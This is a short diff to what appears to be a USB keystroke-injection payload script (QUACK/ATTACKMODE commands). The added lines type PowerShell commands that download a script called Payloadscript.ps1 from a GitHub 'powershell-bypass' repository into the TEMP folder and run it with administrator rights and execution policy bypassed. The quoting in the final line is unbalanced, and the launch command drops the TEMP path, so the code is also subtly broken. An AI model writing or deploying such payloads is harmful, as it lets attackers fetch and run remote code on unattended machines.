@@ -47,5 +47,12 @@ QUACK ENTER
 QUACK DELAY 300
 QUACK STRING "powershell"
 QUACK ENTER
+QUACK STRING "$scriptUrl = 'https://raw.githubusercontent.com/GHXSTFPS/powershell-bypass/main/V1/Payloadscript.ps1'"
+QUACK ENTER
+QUACK DELAY 1000
+QUACK STRING "$dest = '$env:TEMP\Payloadscript.ps1'"
+QUACK ENTER
+QUACK STRING "Invoke-WebRequest -Uri $scriptUrl -OutFile $dest"
+QUACK STRING "Start-Process powershell.exe -Verb RunAs -ArgumentList "-ExecutionPolicy Bypass -File Payloadscript.ps1"
 QUACK LED G
 ATTACKMODE OFF
